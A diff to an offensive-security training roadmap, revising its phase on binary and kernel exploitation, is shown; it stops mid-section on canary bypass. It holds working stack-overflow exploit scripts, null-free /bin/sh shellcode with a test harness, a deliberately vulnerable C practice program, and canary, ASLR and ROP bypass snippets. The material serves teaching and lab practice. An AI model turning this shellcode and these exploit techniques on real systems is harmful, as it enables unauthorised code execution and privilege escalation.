@@ -7184,694 +7184,2484 @@ Before you go: Phase 3 is System and Kernel Exploitation. The gap between Phase 
 
 ---
 
-## PHASE 3: SYSTEM & KERNEL EXPLOITATION (6–12 Months)
+# PHASE 3: SYSTEM & KERNEL EXPLOITATION
 
-### Goal
-Low-level exploitation from first principles. Write exploits from scratch. Understand the CPU, the memory manager, the kernel. This is where most people quit. If you finish this, you're in the top 5%.
+<div align="right">
 
-### Checkpoint: What You Must Know
-By end of Phase 3:
-- ✓ Write stack-based buffer overflow exploits from scratch (no tools)
-- ✓ Bypass: stack canary, NX/DEP, ASLR
-- ✓ Build ROP chains to execute arbitrary code in DEP-protected environments
-- ✓ Write custom shellcode (x86-64, Linux and Windows syscalls)
-- ✓ Reverse engineer binaries: identify vulnerabilities from disassembly
-- ✓ Exploit heap vulnerabilities: use-after-free, double-free, heap spray
-- ✓ Understand kernel architecture and write kernel exploits (Linux + Windows)
-- ✓ Bypass Control Flow Guard (CFG) and related mitigations
+**Where most people quit. Where real operators are made.**
 
-### Milestone Projects
+</div>
 
-1. **Custom Stack Overflow Exploit** (Week 8–12)
-   - Vulnerable binary, no tools except GDB and pwntools
-   - Bypass canary and ASLR
-   - Deliverable: working exploit + root cause analysis
-
-2. **ROP Chain Builder** (Week 12–16)
-   - Analyze binary with ropper, build chain to call system()
-   - Execute in DEP-protected environment
-   - Deliverable: Python script generating working ROP chain
-
-3. **Kernel Privilege Escalation Exploit** (Week 20–28)
-   - Real CVE, write from scratch using published root cause
-   - Deliver root shell
-   - Deliverable: working exploit, detailed analysis
+**Duration:** 6–12 Months | **Difficulty:** Advanced | **Hours/Week:** 35–40 | **Prerequisites:** Phase 2 | **Completion Rate:** 20% of remaining
 
 ---
 
-### Curriculum
 
-#### **1. Binary Exploitation Fundamentals**
+## WHO THIS PHASE IS FOR
 
-**Time:** 4–6 weeks | **Difficulty:** Very Hard
+You finished Phase 2. You can enumerate a network, pivot, spray credentials, break WPA2. Now you go lower, below the application, below the OS, below the kernel. This is where most people quit. This is also where real operators are made.
+
+Phase 3 teaches you to write exploits from first principles. Not to use Metasploit. Not to paste PoC code. To understand what is happening at the instruction level and build the primitive yourself. By the end of this phase you are in the top 5% of practitioners worldwide.
+
+**No shortcuts. No "I ran the exploit." No surface knowledge.**
+
+---
+
+## PHASE 3 MAP
+
+```
+Phase 3: System & Kernel Exploitation
+│
+├── 0. Environment Setup (Do This First: No Exceptions)
+├── 1. Binary Exploitation Fundamentals
+│   ├── Memory layout, stack, registers
+│   ├── GDB + pwndbg debugging
+│   └── Stack buffer overflow (no protections)
+├── 2. Shellcode Writing
+│   ├── x86-64 Linux syscalls
+│   ├── x86-64 Windows syscalls
+│   └── Null-free techniques
+├── 3. Exploit Mitigations & Bypass
+│   ├── Stack canary bypass
+│   ├── NX / DEP bypass (ret2libc)
+│   ├── ASLR bypass (information leak)
+│   ├── PIE bypass
+│   └── ROP chain building
+├── 4. Format String Vulnerabilities
+│   ├── Stack leak via %p/%x
+│   ├── Arbitrary write via %n
+│   └── Modern RELRO-aware technique
+├── 5. Heap Exploitation (Linux glibc: Modern)
+│   ├── glibc allocator internals
+│   ├── Tcache poisoning
+│   ├── Use-After-Free / Double-Free
+│   ├── Safe-Linking bypass (glibc 2.32+)  ← 2027-critical
+│   ├── House of Spirit / House of Force
+│   └── Large bin attack
+├── 6. Windows Heap Exploitation
+│   ├── NT Heap vs Segment Heap
+│   └── LFH type confusion
+├── 7. Linux Kernel Exploitation
+│   ├── QEMU + GDB kernel lab setup
+│   ├── SMEP / SMAP / KASLR / KPTI
+│   ├── Kernel UAF and race conditions
+│   └── commit_creds + KPTI trampoline
+├── 8. Windows Kernel Exploitation     ← REBUILT (was nearly absent)
+│   ├── WinDbg kernel debugging setup
+│   ├── HEVD: HackSys Extreme Vulnerable Driver
+│   ├── Kernel stack overflow + token stealing
+│   ├── Kernel pool exploitation
+│   └── BYOVD (Bring Your Own Vulnerable Driver)
+├── 9. ARM64 Exploitation              ← NEW (critical for 2027)
+│   ├── AArch64 architecture & calling convention
+│   ├── ARM64 shellcode
+│   └── PAC (Pointer Authentication Codes) bypass
+├── 10. Control Flow Guard (CFG) Bypass  ← NEW (was listed, never taught)
+│    ├── How CFG works internally
+│    ├── Valid/invalid call targets
+│    └── JIT spray + type confusion bypass
+├── 11. eBPF Rootkits (Linux)
+├── 12. HVCI / VBS / Kernel Security 2026–2027
+├── 13. Mobile Security (Android + iOS)
+└── 14. Milestones, CTF Progression, Lab Setup
+```
+
+---
+
+## TIMELINE
+
+| Block | Content | Duration | Difficulty |
+|---|---|---|---|
+| Environment Setup | Lab, tools, GDB | 3–5 days | Medium |
+| Binary Exploitation Fundamentals | Stack, overflow, GDB | 4–6 weeks | Very Hard |
+| Shellcode | Assembly, syscalls | 2–3 weeks | Very Hard |
+| Mitigations & Bypass | Canary, NX, ASLR, ROP | 4–6 weeks | Extreme |
+| Format Strings | Leak + write | 1–2 weeks | Hard |
+| Heap (Linux) | glibc + Safe-Linking | 4–5 weeks | Extreme |
+| Windows Heap | NT Heap + Segment | 3–4 weeks | Extreme |
+| Linux Kernel | QEMU lab + exploits | 4–6 weeks | Extreme |
+| Windows Kernel | HEVD + token stealing | 4–6 weeks | Extreme |
+| ARM64 | AArch64 + PAC | 2–3 weeks | Very Hard |
+| CFG Bypass | Windows CFI | 1–2 weeks | Extreme |
+| eBPF Rootkits | Kernel hooks | 4–6 weeks | Extreme |
+| HVCI / VBS | Ring-1 architecture | 2–3 weeks | Extreme |
+| Mobile | Android + iOS | 6–8 weeks | Very Hard |
+| **TOTAL** | | **6–12 months** | |
+
+---
+
+## GOAL
+
+**Low-level exploitation from first principles. Write exploits from scratch. Understand the CPU, the memory manager, the kernel: on both Linux AND Windows, on both x86-64 AND ARM64.**
+
+By end of Phase 3 you are dangerous to most hardened targets. Not because you run tools. Because you understand what the tools do and can rebuild them when they fail.
+
+---
+
+## CHECKPOINT: WHAT YOU MUST KNOW BY THE END
+
+- ✓ Write stack-based buffer overflow exploits from scratch (no tools)
+- ✓ Write custom shellcode: x86-64 Linux AND Windows syscalls, null-free
+- ✓ Bypass: stack canary, NX/DEP, ASLR (information leak + ROP), PIE
+- ✓ Build ROP chains to execute arbitrary code in DEP-protected environments
+- ✓ Exploit format string vulnerabilities: leak + arbitrary write on full RELRO binaries
+- ✓ Exploit heap UAF/double-free using tcache poisoning
+- ✓ Bypass Safe-Linking (glibc 2.32+) to perform tcache poisoning on modern targets
+- ✓ Write Linux kernel privilege escalation exploit (user → root) from scratch
+- ✓ Debug Windows kernel with WinDbg, exploit HEVD stack overflow, steal token
+- ✓ Write ARM64 shellcode; understand PAC and its bypass primitives
+- ✓ Bypass Control Flow Guard (CFG): not just list it, demonstrate it
+- ✓ Analyze a real CVE: root cause understood, custom PoC written, not copy-pasted
+
+---
+
+## MILESTONE PROJECTS
+
+All milestones require a working deliverable + written root cause analysis. "It ran and gave me a shell" is not a deliverable. Understanding why it works is the deliverable.
+
+| # | Project | Week | Deliverable |
+|---|---|---|---|
+| M1 | Stack overflow exploit (no protections) | 4–6 | Python script + root cause write-up |
+| M2 | Canary + ASLR bypass via info leak + ROP | 8–12 | Working exploit + ROP chain annotated |
+| M3 | Format string: leak libc + arbitrary write on RELRO binary | 12–14 | Working exploit |
+| M4 | Heap UAF + tcache poisoning with Safe-Linking bypass | 16–20 | Working exploit on glibc 2.35 |
+| M5 | Linux kernel LPE: real CVE, written from scratch | 20–28 | Root shell + detailed analysis |
+| M6 | Windows kernel LPE: HEVD stack overflow + token steal | 28–36 | Root shell on Windows 10/11 VM |
+| M7 | ARM64 shellcode execve(/bin/sh), written from scratch | 36–40 | Working shellcode, annotated |
+| M8 | CFG bypass PoC on a real Windows binary | 40–44 | Working bypass + explanation |
+
+---
+
+## 0. ENVIRONMENT SETUP (DO THIS FIRST: NO EXCEPTIONS)
+
+> Beginners waste days failing because their environment is broken. Get this right before writing one line of exploit code.
+
+### Linux Exploitation Lab
+
+```bash
+# OS: Ubuntu 22.04 LTS (recommended: glibc 2.35 matches real targets)
+# Use a VM: VirtualBox or VMware Workstation
+
+# ── Core tools ──────────────────────────────────────────────────────────────
+sudo apt update && sudo apt install -y \
+    gcc g++ gdb python3 python3-pip git nasm \
+    build-essential libc6-dbg patchelf \
+    binutils elfutils ltrace strace \
+    qemu-system-x86 qemu-system-arm \
+    libssl-dev libffi-dev
+
+# ── pwntools (Python exploit framework) ─────────────────────────────────────
+pip3 install pwntools
+
+# Test pwntools:
+python3 -c "from pwn import *; print(asm(shellcraft.amd64.linux.sh()).hex())"
+# Expected: long hex string of shellcode bytes
+
+# ── pwndbg (GDB plugin: essential, replaces vanilla GDB entirely) ───────────
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg && ./setup.sh
+# pwndbg replaces the default GDB interface with:
+# - 'context' pane: registers, stack, disassembly, backtrace all visible at once
+# - 'heap' command: inspect glibc heap chunks
+# - 'vmmap': memory map with permissions
+# - 'search': search all memory for a pattern or value
+
+# ── GEF (alternative to pwndbg: install only one) ──────────────────────────
+# bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+
+# ── ROPgadget / Ropper (ROP chain building) ─────────────────────────────────
+pip3 install ROPgadget
+pip3 install ropper
+
+# ── checksec (check binary protections) ─────────────────────────────────────
+pip3 install checksec
+
+# Run checksec on any binary:
+checksec --file=/bin/ls
+# Output shows: RELRO, Stack Canary, NX, PIE, RPATH, RUNPATH
+
+# ── patchelf (change binary interpreter / RPATH: for local libc matching) ──
+# Already installed above
+
+# ── glibc debug symbols (needed for heap debugging) ─────────────────────────
+sudo apt install -y libc6-dbg
+# Now GDB can step into malloc(), free(), etc.
+```
+
+### GDB Quickstart - Essential Commands
+
+```bash
+# Start GDB:
+gdb ./binary           # load binary
+gdb -q ./binary        # quiet mode (no banner)
+r                      # run
+r arg1 arg2            # run with arguments
+r < input_file         # run with stdin from file
+r <<< $(python3 -c "print('A'*100)")  # run with inline payload
+
+# Breakpoints:
+b main                 # break at function name
+b *0x4011a0            # break at address
+b *main+42             # break at offset from function
+info b                 # list breakpoints
+d 1                    # delete breakpoint 1
+
+# Stepping:
+ni                     # next instruction (step over calls)
+si                     # step instruction (step into calls)
+c                      # continue to next breakpoint
+finish                 # run until current function returns
+
+# Inspection:
+x/20gx $rsp            # examine 20 quadwords (8-byte) at RSP (stack)
+x/20wx $rsp            # examine 20 words (4-byte) at RSP
+x/s 0x4040a0           # examine as string at address
+p $rax                 # print register value
+info registers         # all registers
+info proc mappings     # memory map (like /proc/self/maps)
+telescope $rsp         # pwndbg: dereference chain from RSP
+
+# pwndbg-specific:
+context                # show full context pane
+heap                   # show heap chunks
+heap bins              # show bin contents (fastbin, tcache, unsorted...)
+vis_heap_chunks        # visual heap layout
+search -s "/bin/sh"    # search all memory for string
+cyclic 200             # generate 200-byte De Bruijn pattern
+cyclic -l 0x6161616b   # find offset in pattern for this value
+```
+
+### Windows Exploitation Lab
+
+```
+Requirements:
+- Windows 10 22H2 or Windows 11 23H2 VM (for user-mode exploitation)
+- Windows 10 22H2 VM for kernel debugging TARGET (separate VM)
+- Windows 11 23H2 HOST with WinDbg for kernel debugging DEBUGGER
+
+Tools to install on the Windows VM:
+1. Visual Studio 2022 Community (C/C++ workload)
+   https://visualstudio.microsoft.com/
+2. WinDbg Preview (from Microsoft Store: newer, better UI)
+   winget install Microsoft.WinDbgPreview
+3. x64dbg (user-mode debugger, better than OllyDbg)
+   https://x64dbg.com/
+4. PE-bear / CFF Explorer (PE file inspection)
+5. Process Hacker 2 (process/memory inspection)
+6. Python 3 + pip
+
+For ARM64 exploitation:
+- QEMU AArch64 system emulation (on Linux host)
+- Alternatively: use pwn.college's built-in ARM64 challenges
+```
+
+---
+
+## 1. BINARY EXPLOITATION FUNDAMENTALS
+
+### Time: 4–6 weeks | Difficulty: Very Hard
+
+### Resources
 
 | Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeY) | YouTube | 20 hours | FREE | **Essential. Watch every video. Code along.** |
-| [Smashing the Stack for Fun and Profit](http://www.phrack.org/issues/49/14.html) | Article | 3 hours | FREE | The foundational text. Read twice. |
-| [The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook-p-9780470080238) | Book | 30 hours | $50–80 | Bible. Reference for life. |
-| [pwn.college](https://pwn.college) | Platform | 40 hours | FREE | ASU university platform. Structured binary exploitation. |
+|---|---|---|---|---|
+| [LiveOverflow Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeY) | YouTube | 20 hrs | FREE | **Watch every video. Code along. No skipping.** |
+| [Smashing the Stack for Fun and Profit](http://www.phrack.org/issues/49/14.html) | Article | 3 hrs | FREE | Phrack #49. The original. Read twice. |
+| [The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook-p-9780470080238) | Book | 30 hrs | $50–80 | Reference for life. |
+| [pwn.college](https://pwn.college) | Platform | 40 hrs | FREE | ASU university platform. Best structured binary course. Start here. |
 
-**Memory Layout Reference:**
+### Memory Layout
+
 ```
-Low addresses (0x00000000)
-├── .text       (code)
-├── .rodata     (read-only data)
-├── .data       (initialized data)
-├── .bss        (uninitialized data)
-├── heap →      (grows up)
+Virtual Address Space (x86-64 Linux process):
+
+Low addresses (0x00000000 00000000)
+├── .text        (executable code: read + execute only)
+├── .rodata      (read-only data: string literals, constants)
+├── .data        (initialized global variables: read/write)
+├── .bss         (uninitialized global variables: zeroed at startup)
 │
-├── ← grows down: stack
+├── [heap]       (grows UPWARD: malloc() allocates here)
+│   0x...
+│
+│   [memory-mapped regions: shared libs, mmap'd files]
+│   /lib/x86_64-linux-gnu/libc.so.6   ← libc loaded here
+│   /lib/x86_64-linux-gnu/ld-linux.so ← dynamic linker
+│
+├── [stack]      (grows DOWNWARD: function calls, local vars)
 │   ├── local variables
-│   ├── saved rbp
-│   ├── return address    ← target for stack overflow
-│   └── function args (past 6th)
-└── kernel space
-High addresses (0xFFFFFFFF)
+│   ├── saved RBP (base pointer of caller)
+│   ├── return address   ← PRIMARY TARGET for stack overflow
+│   └── function arguments (args 7+ on x86-64; args 1-6 in registers)
+│
+High addresses (0xFFFFFFFF FFFFFFFF)
+└── kernel space (inaccessible from user space)
+
+KEY FACT: Stack grows DOWN. When you declare local variables,
+they sit at lower addresses than the saved return address.
+Buffer overflow writes past the end of a local array → overwrites
+saved RBP → overwrites return address → control of instruction pointer.
 ```
 
-**Stack Buffer Overflow:**
-```python
-# pwntools exploit skeleton
+### x86-64 Calling Convention (System V AMD64 ABI)
+
+```
+Integer/pointer arguments go in registers (left to right):
+  1st arg → RDI
+  2nd arg → RSI
+  3rd arg → RDX
+  4th arg → RCX
+  5th arg → R8
+  6th arg → R9
+  7th+ arg → pushed on stack (right to left)
+
+Return value → RAX (64-bit) or EAX (32-bit)
+
+Caller-saved: RAX, RCX, RDX, RSI, RDI, R8–R11
+  (caller saves these if it needs them after the call)
+Callee-saved: RBX, RBP, R12–R15
+  (called function must restore these before returning)
+
+Stack must be 16-byte aligned before CALL instruction.
+After CALL pushes the return address, RSP is 8-byte aligned.
+This matters: MOVAPS (SSE instructions) crash on unaligned stack.
+Fix: insert a bare `ret` gadget to re-align before calling system().
+```
+
+### First Exploit: Stack Buffer Overflow (No Protections)
+
+```c
+// Compile this as your practice target:
+// gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack
+// -fno-stack-protector: no canary
+// -no-pie: fixed base address (no PIE/ASLR)
+// -z execstack: stack is executable (for shellcode injection)
+
+#include <stdio.h>
+#include <string.h>
+
+void win() {
+    // This function is never called normally.
+    // Your goal: redirect execution here.
+    system("/bin/sh");
+}
+
+void vulnerable(char *input) {
+    char buf[64];         // 64 bytes on the stack
+    strcpy(buf, input);   // NO bounds check: copies until null byte
+    printf("You said: %s\n", buf);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) { puts("Usage: ./vuln <input>"); return 1; }
+    vulnerable(argv[1]);
+    return 0;
+}
+```
+
+```bash
+# Step 1: Check protections
+checksec --file=./vuln
+# Expected: No RELRO, No Canary, NX disabled, No PIE
+
+# Step 2: Find address of win()
+objdump -d ./vuln | grep '<win>'
+# Example output: 0000000000401196 <win>:
+# win_addr = 0x401196
+
+# Step 3: Find the offset to the return address
+# Use a De Bruijn cyclic pattern (no repeated substrings)
+python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pattern
+
+gdb ./vuln
+r $(python3 -c "from pwn import *; print(cyclic(200).decode())")
+# Program crashes with SIGSEGV
+# pwndbg shows: RSP = 0x6161616c6161616b or similar
+
+# In GDB, find the offset:
+python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
+# Example output: 72
+# This means 72 bytes fill buf + saved RBP, next 8 bytes = return address
+
+# Step 4: Build and send the exploit
+python3 -c "
 from pwn import *
 
-p = process('./vulnerable')
-# p = remote('target', 1337)
+p = process('./vuln')
 
-# Step 1: Find offset to return address
-# cyclic(200) → segfault → cyclic_find(rip_value)
-offset = 40
+offset = 72          # bytes to reach return address
+win_addr = 0x401196  # address of win(): replace with your actual value
 
-# Step 2: Find ROP gadgets or shellcode landing
-rop = ROP('./vulnerable')
-ret = rop.ret.address      # stack alignment gadget
+payload = b'A' * offset         # fill buffer and saved RBP
+payload += p64(win_addr)        # overwrite return address with win()
 
-# Step 3: Build payload
-payload = b'A' * offset
-payload += p64(ret)         # alignment
-payload += p64(win_addr)    # function to jump to
+p.sendline(payload)
+p.interactive()                 # interact with the shell
+"
+```
 
-p.sendlineafter(b'> ', payload)
-p.interactive()
+### Understanding What Happened
+
+```
+Before overflow:            After overflow:
+─────────────────          ─────────────────
+[ buf[0..63]    ]          [ AAAA...AAAA    ]  ← 64 bytes of 'A'
+[ saved RBP     ]          [ AAAA AAAA      ]  ← 8 more 'A' (overwrite RBP)
+[ return addr   ]  ──→     [ 0x401196       ]  ← our win() address
+─────────────────          ─────────────────
+
+When vulnerable() executes RET:
+  RET pops the 8 bytes at RSP into RIP
+  RSP was pointing at "return addr" slot
+  Now RIP = 0x401196 = win()
+  CPU jumps to win() → system("/bin/sh") → shell
 ```
 
 ---
 
-#### **2. Shellcode Writing**
+## 2. SHELLCODE WRITING
 
-**Time:** 2–3 weeks | **Difficulty:** Very Hard
+### Time: 2–3 weeks | Difficulty: Very Hard
+
+### Resources
 
 | Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [Writing Shellcode - YouTube](https://www.youtube.com/watch?v=ixptghqAVnk) | YouTube | 3 hours | FREE | Practical shellcode development. |
-| [Shell-storm Shellcode DB](http://shell-storm.org/shellcode/) | Reference | 5 hours | FREE | Study, don't copy. Understand each one. |
+|---|---|---|---|---|
+| [Writing Shellcode - YouTube](https://www.youtube.com/watch?v=ixptghqAVnk) | YouTube | 3 hrs | FREE | Start here. Practical dev. |
+| [Shell-storm Shellcode DB](http://shell-storm.org/shellcode/) | Reference | 5 hrs | FREE | Study, don't copy; understand each one. |
+| [Nightmare - Shellcode](https://guyinatuxedo.github.io/02-intro_tooling/pwntools/index.html) | Guide | 4 hrs | FREE | Nightmare CTF guide series. |
+
+### x86-64 Linux Syscalls
 
 ```nasm
-; x86-64 Linux /bin/sh shellcode (null-free)
-; syscall: execve("/bin/sh", NULL, NULL)
+; System calls in x86-64 Linux:
+; syscall number → RAX
+; arg1 → RDI, arg2 → RSI, arg3 → RDX, arg4 → R10, arg5 → R8, arg6 → R9
+; execute: SYSCALL instruction
+; return value → RAX
+
+; KEY SYSCALL NUMBERS (x86-64 Linux):
+;   0  = read(fd, buf, count)
+;   1  = write(fd, buf, count)
+;   2  = open(path, flags, mode)
+;  59  = execve(pathname, argv[], envp[])
+;  60  = exit(status)
+; 231  = exit_group(status)
+
+; ─── Minimal execve("/bin/sh") shellcode ────────────────────────────────────
+; Executes /bin/sh with no arguments and no environment variables
+; syscall: execve(pathname="/bin/sh", argv=NULL, envp=NULL)
 
 section .text
 global _start
 
 _start:
-    xor rdx, rdx            ; envp = NULL
-    xor rsi, rsi            ; argv = NULL
-    lea rdi, [rel binsh]    ; pathname = "/bin/sh"
-    push 59                 ; execve syscall number
+    ; Set up envp = NULL (rdx = 3rd argument)
+    xor rdx, rdx
+
+    ; Set up argv = NULL (rsi = 2nd argument)
+    xor rsi, rsi
+
+    ; Set up pathname = "/bin/sh" on the stack
+    ; Push in reverse, 8 bytes at a time
+    ; "/bin/sh\0" = 0x0068732f6e69622f
+    push rdx                    ; push null byte (string terminator)
+    mov rax, 0x68732f2f6e69622f ; "/bin//sh" (8 chars, no null yet)
+    push rax
+    mov rdi, rsp                ; rdi = pointer to "/bin//sh\0"
+
+    ; Set up syscall number = 59 (execve)
+    push 59
     pop rax
+
+    ; Execute syscall
     syscall
-
-binsh:
-    db "/bin/sh", 0
 ```
 
-```python
-# Extract shellcode bytes from compiled binary:
-# nasm -f elf64 shellcode.asm -o shellcode.o
-# objdump -d shellcode.o | grep -Po '\\x[0-9a-f]{2}'
-
-# Test:
-from pwn import *
-shellcode = asm(shellcraft.amd64.linux.sh())
-print(enhex(shellcode))
-print(f"Length: {len(shellcode)} bytes")
-```
-
-**Avoiding Null Bytes:**
-```nasm
-; Instead of: mov rax, 59 (encodes null bytes)
-; Use:        xor eax, eax; push 59; pop rax
-;
-; Instead of: mov rdi, "/bin/sh\0"
-; Push string in reverse on stack:
-push 0x68               ; 'h\0' (stack provides null)
-mov rax, 0x732f2f6e6962 ; '/bin//s'
-push rax
-mov rdi, rsp
-```
-
----
-
-#### **3. Exploit Mitigations & Bypass**
-
-**Time:** 4–6 weeks | **Difficulty:** Extreme
-
-| Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [Bypassing ASLR](https://www.youtube.com/watch?v=7Tq7UHZXMHY) | YouTube | 2 hours | FREE | Information leak → gadget discovery. |
-| [ROP Emporium](https://ropemporium.com/) | Platform | 20 hours | FREE | Designed specifically for ROP. Do all 8 challenges. |
-| [Ropper](https://github.com/sashs/Ropper) | Tool | 2 hours | FREE | Gadget finder. `ropper -f binary --search "pop rdi"` |
-
-**Stack Canary Bypass:**
-```python
-# Method 1: Leak canary via format string
-payload = b'%11$p'        # Adjust offset for your binary
-p.sendline(payload)
-canary = int(p.recvline(), 16)
-
-# Method 2: Brute force (fork() servers only)
-for byte in range(256):
-    p = remote(...)
-    p.send(b'A' * offset + bytes([byte]))
-    # If no crash: this byte is correct, move to next
-
-# Build overflow with canary
-payload = b'A' * offset_to_canary
-payload += p64(canary)      # Preserved canary
-payload += p64(0)           # Saved rbp (don't care)
-payload += p64(win_addr)    # Overwrite return address
-```
-
-**ASLR Bypass:**
-```python
-# Step 1: Find a format string or memory disclosure
-# Step 2: Calculate base from leaked address
-leaked_puts = int(p.recvline(), 16)
-libc_base = leaked_puts - libc.symbols['puts']
-system = libc_base + libc.symbols['system']
-binsh = libc_base + next(libc.search(b'/bin/sh'))
-ret = libc_base + 0x25679    # ret gadget for alignment
-
-# Step 3: Build ROP chain
-rop = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
-payload = b'A' * offset + rop
-```
-
-**Building ROP Chains:**
 ```bash
-# Find gadgets
-ropper -f binary --search "pop rdi; ret"
-ROPgadget --binary binary --rop
+# Compile, extract shellcode bytes, test:
 
-# Common needed gadgets:
-# pop rdi; ret       (first arg to function)
-# pop rsi; ret       (second arg)
-# pop rdx; ret       (third arg, rare in libc)
-# ret                (stack alignment: required before MOVAPS)
+# Step 1: Assemble
+nasm -f elf64 shellcode.asm -o shellcode.o
 
-# ret2libc (classic):
-# leak libc → calculate base → call system("/bin/sh")
-# pop rdi; ret; &"/bin/sh"; ret; system()
+# Step 2: Extract bytes
+objdump -d shellcode.o | grep -Po '[0-9a-f]{2} ' | tr -d ' \n'
+# Alternative: use pwntools
+python3 -c "from pwn import *; sc = asm(shellcraft.amd64.linux.sh()); print(enhex(sc)); print(f'Length: {len(sc)} bytes')"
+
+# Step 3: Test shellcode in a harness
+cat > test_shellcode.c << 'EOF'
+#include <stdio.h>
+#include <string.h>
+#include <sys/mman.h>
+
+// Your shellcode bytes here
+unsigned char shellcode[] = "\x48\x31\xd2\x48\x31\xf6\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x6a\x3b\x58\x0f\x05";
+
+int main() {
+    void *mem = mmap(NULL, sizeof(shellcode),
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    memcpy(mem, shellcode, sizeof(shellcode));
+    ((void(*)())mem)();  // cast to function pointer and call
+    return 0;
+}
+EOF
+gcc -o test_shellcode test_shellcode.c
+./test_shellcode   # Should spawn /bin/sh
+```
+
+### Avoiding Null Bytes (Critical: strcpy/gets stop at null)
+
+```nasm
+; PROBLEM: null bytes (\x00) in shellcode terminate strcpy/gets
+; These instructions encode null bytes:
+;   mov rax, 59    → 48 C7 C0 3B 00 00 00  (three nulls in the 32-bit zero-extend)
+;   mov rdi, 0     → 48 C7 C7 00 00 00 00  (four nulls)
+;
+; SOLUTIONS:
+
+; 1. Use XOR to zero a register (never encodes null bytes)
+xor rax, rax        ; rax = 0  (encodes as: 48 31 C0: no nulls)
+xor rdi, rdi        ; rdi = 0
+
+; 2. Use PUSH/POP for small immediates
+push 59             ; encodes as: 6A 3B  (one byte immediate, no nulls)
+pop rax             ; eax = 59
+
+; 3. Build strings on the stack (avoids hardcoded addresses)
+; Instead of: mov rdi, 0x4040a0  (depends on address containing nulls)
+; Push the string bytes in 8-byte chunks:
+xor rax, rax
+push rax            ; null terminator (but rax is 0, same as xor trick)
+                    ; ← wait, this pushes 0 which is a null... but in MEMORY not in shellcode
+                    ; the shellcode byte for 'push rax' is 50, no null in the instruction
+mov rax, 0x68732f2f6e69622f   ; "/bin//sh"
+push rax
+mov rdi, rsp        ; rdi points to "/bin//sh\0" on the stack
+
+; 4. Avoid short-form encodings that embed nulls:
+; Instead of: cmp eax, 0   → 83 F8 00 (null!)
+; Use:        test eax, eax → 85 C0   (no null)
+
+; Always check your final shellcode:
+python3 -c "sc = bytes.fromhex('YOUR_HEX'); print(f'Has null: {chr(0) in sc.decode(\"latin1\")}')"
+```
+
+### x86-64 Windows Shellcode (WinAPI)
+
+```nasm
+; Windows does not use Linux syscall numbers.
+; Windows syscall numbers change EVERY BUILD (by design: anti-exploit).
+; Correct approach: resolve function addresses at runtime via PEB walking.
+
+; HIGH-LEVEL WINDOWS SHELLCODE PATTERN:
+; 1. Find kernel32.dll base via PEB → InMemoryOrderModuleList
+; 2. Walk kernel32's export table to find LoadLibraryA, GetProcAddress
+; 3. Use GetProcAddress to resolve WinExec or CreateProcessA
+; 4. Call WinExec("cmd.exe", SW_SHOW)
+
+; PEB (Process Environment Block) is always at GS:[0x60] on x86-64 Windows
+; PEB+0x18 = PEB_LDR_DATA*
+; PEB_LDR_DATA+0x20 = InMemoryOrderModuleList (doubly-linked list)
+; List entry 1 = ntdll.dll, entry 2 = kernel32.dll (usually)
+; Each entry+0x20 = DllBase (the base address of the DLL)
+
+; Practical approach for beginners: use pwntools' Windows shellcraft
+# Python:
+from pwn import *
+context.arch = 'amd64'
+context.os   = 'windows'
+sc = asm(shellcraft.windows.x86_64.WinExec('cmd.exe'))
+print(enhex(sc))
+
+; Or use msfvenom for Windows payloads (standard in real engagements):
+; msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00'
+; Study the output to understand the PEB-walking pattern.
 ```
 
 ---
 
-#### **4. Heap Exploitation**
+## 3. EXPLOIT MITIGATIONS & BYPASS
 
-**Time:** 3–4 weeks | **Difficulty:** Extreme
+### Time: 4–6 weeks | Difficulty: Extreme
+
+### Resources
 
 | Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [pwn.college Heap Exploitation](https://pwn.college/system-security/heap-exploitation/) | Platform | 15 hours | FREE | Best structured heap exploitation course. |
-| [glibc malloc internals](https://sourceware.org/glibc/wiki/MallocInternals) | Docs | 5 hours | FREE | Understand what you're corrupting. |
-| [How2Heap](https://github.com/shellphish/how2heap) | Repository | 10 hours | FREE | Working examples of every heap technique. |
+|---|---|---|---|---|
+| [ROP Emporium](https://ropemporium.com/) | Platform | 20 hrs | FREE | **Do all 8 challenges. Designed specifically for ROP.** |
+| [Bypassing ASLR](https://www.youtube.com/watch?v=7Tq7UHZXMHY) | YouTube | 2 hrs | FREE | Information leak → base calculation |
+| [Ropper](https://github.com/sashs/Ropper) | Tool | 2 hrs | FREE | `ropper -f binary --search "pop rdi"` |
+| [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) | Tool | 2 hrs | FREE | `ROPgadget --binary binary --rop` |
 
-**Core Heap Concepts:**
+### The Four Main Mitigations
+
+```
+┌──────────────────────────────────────────────────────────────────┐
+│ MITIGATION     │ WHAT IT DOES              │ BYPASS METHOD       │
+├──────────────────────────────────────────────────────────────────┤
+│ Stack Canary   │ Random value before retaddr│ Leak or brute-force │
+│ NX / DEP       │ Stack not executable       │ ROP (code reuse)    │
+│ ASLR           │ Randomize load addresses  │ Info leak → calculate│
+│ PIE            │ Randomize binary base      │ Info leak → calculate│
+└──────────────────────────────────────────────────────────────────┘
+```
+
+### Stack Canary Bypass
+
+```python
+# What a canary is:
+# GCC inserts a random value (the "canary") between local vars and saved RBP
+# Stack frame with canary:
+#   [ local variables ]
+#   [ canary value    ]  ← must be unchanged when function returns
+#   [ saved RBP       ]
+#   [ return address  ]
